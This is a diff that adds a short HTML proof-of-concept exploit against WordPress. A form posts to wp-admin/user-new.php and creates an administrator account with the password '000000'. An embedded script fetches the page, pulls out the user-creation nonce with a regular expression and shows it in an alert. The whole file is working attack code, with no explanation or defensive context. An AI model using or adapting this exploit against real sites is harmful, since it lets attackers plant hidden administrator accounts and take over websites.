@@ -1,0 +1,41 @@
+<html><body>
+
+<form name='form1' method='POST' action='http://bitarov/wp-admin/user-new.php'>
+<input name='action' value='createuser'><br>
+<input name='_wpnonce_create-user' value='176aaf3d8f'><br>
+<input name='_wp_http_referer' value='/wp-admin/user-new.php'><br>
+<input name='user_login' value='test'><br>
+<input name='email' value='test@test.ru'><br>
+<input name='first_name' value=''><br>
+<input name='last_name' value=''><br>
+<input name='url' value=''><br>
+<input name='pass1' value='000000'><br>
+<input name='pass2' value='000000'><br>
+<input name='role' value='administrator'><br>
+<input name='createuser' value='Добавить нового пользователя'><br>
+<input type='submit'>
+</form>
+
+<script type='text/javascript'>
+function httpget(url)
+ {
+ var xhr, result;
+ if (window.XMLHttpRequest) xhr = new XMLHttpRequest();
+ else xhr = new ActiveXObject("Microsoft.XMLHTTP");
+ xhr.open('GET', url, false);
+ xhr.send('');
+ if ((xhr.status<200) || (xhr.status>299)) result = false;
+ else result = xhr.responseText;
+ delete xhr;
+ return result;
+ }
+
+var resp = httpget('http://bitarov/wp-admin/user-new.php');
+var hash = resp.match(/\<input[^\<\>]+_wpnonce_create\-user[^\<\>]+\>/);
+hash = hash[0].match(/value\=[\'\"]([a-z0-9]{4,40})[\'\"]/);
+hash = hash[1];
+alert(hash);
+
+</script>
+
+</body></html>
